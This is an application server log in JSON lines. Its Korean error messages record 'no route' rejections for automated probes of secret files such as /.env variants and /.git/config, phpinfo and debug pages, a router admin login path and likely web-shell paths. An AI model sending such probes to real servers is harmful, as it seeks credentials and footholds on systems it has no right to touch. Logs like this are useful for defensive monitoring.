{"level":"info","message":"hello"}
{"level":"error","message":"GET /rest/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /rest/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /admin-app/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /admin-app/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /private/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /private/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /enviroments/.env.production 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /enviroments/.env.production 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.production 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.production 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.prod 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.prod 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /cp/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /cp/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /frontend_dev.php/$ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /debug/default/view?panel=config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.json 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /config.json 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /phpinfo.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /?phpinfo=1 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /info.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /_profiler/phpinfo 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"HEAD / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sendgrid/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /info.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /Pages/log/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
